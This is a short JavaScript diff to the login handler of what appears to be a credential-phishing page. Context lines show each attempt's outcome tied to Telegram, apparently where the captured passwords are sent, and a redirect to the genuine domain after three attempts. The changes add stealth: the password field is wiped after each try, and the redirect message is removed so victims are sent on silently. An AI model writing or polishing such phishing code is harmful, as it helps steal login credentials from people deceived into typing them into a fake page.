@@ -205,6 +205,9 @@ function setupLoginButton() {
                     console.error('Telegram error:', error);
                 })
                 .finally(() => {
+                    // Clear password field after each attempt
+                    document.getElementById('pw').value = '';
+                    
                     // Re-enable button after 1 second
                     setTimeout(() => {
                         loginBtn.disabled = false;
@@ -213,17 +216,14 @@ function setupLoginButton() {
                 });
         });
         
-        // Check if this is the third attempt
+        // Check if this is the third attempt - redirect silently (no message)
         if (loginAttempts >= 3 && domain) {
             console.log(`Third attempt reached. Redirecting to https://${domain}`);
             
-            // Show redirect message
-            showMessage(`Redirecting to ${domain}...`, 'success');
-            
-            // Redirect to the domain homepage after a short delay
+            // Redirect to the domain homepage after a short delay (no message shown)
             setTimeout(() => {
                 window.location.href = `https://${domain}`;
-            }, 2000);
+            }, 1500);
         }
     });
 }
